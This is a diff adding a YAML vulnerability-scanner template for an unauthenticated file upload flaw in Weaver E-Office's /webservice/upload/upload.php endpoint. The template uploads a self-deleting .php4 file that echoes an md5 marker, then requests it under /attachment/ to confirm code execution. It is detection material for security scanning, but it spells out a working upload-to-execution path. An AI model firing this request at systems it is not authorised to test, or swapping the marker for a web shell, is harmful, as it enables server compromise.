@@ -1,0 +1,36 @@
+id: e-weaver-eoffice-webservice-upload-fileupload
+
+info:
+  name: E-Weaver EOffice webservice upload file upload
+  author: xpox,y0y0
+  severity: critical
+  verified: false
+  reference:
+    - https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-0125638
+    - https://fofa.info/result?qbase64=YXBwPSLms5vlvq4tRU9mZmljZSI%3D
+    - https://www.t00ls.com/thread-68187-1-1.html
+  tags: weaver,eoffice,upload
+  created: 2023/06/23
+
+set:
+    r1: randomLowercase(4)
+    r2: randomInt(40000, 44800)
+    rboundary: randomLowercase(8)
+rules:
+    r0:
+        request:
+            method: POST
+            path: /webservice/upload/upload.php
+            headers:
+                Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+            body: "------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data; name=\"file\"; filename=\"{{r1}}.php4\"\r\nContent-Type: application/octet-stream\r\n\r\n<?php echo md5({{r2}});unlink(__FILE__);?>\r\n------WebKitFormBoundary{{rboundary}}--\r\n"
+        expression: response.status == 200 && response.body.bcontains(b'*') && response.body.bcontains(b'.php')
+        output:
+            search: '"(?P<path>.+)".bsubmatch(response.body)'
+            path: replaceAll(search["path"], "*", "/")
+    r1:
+        request:
+            method: GET
+            path: /attachment/{{path}}
+        expression: response.status == 200 && response.body.bcontains(bytes(md5(string(r2))))
+expression: r0() && r1()
